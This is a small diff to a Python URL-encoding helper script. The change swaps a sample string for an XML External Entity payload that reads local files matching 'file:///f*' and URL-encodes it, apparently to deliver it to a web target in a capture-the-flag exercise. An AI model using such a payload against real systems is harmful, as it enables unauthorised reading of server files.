@@ -6,7 +6,7 @@ def url_decode(encoded_text):
     decoded_text = unquote(encoded_text)
     return decoded_text
 
-original_text = "大牛"
+original_text = '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///f*"> ]> <xml><name>&xxe;</name></xml>'
 print("Original text:", original_text)
 
 encoded_text = url_encode(original_text)
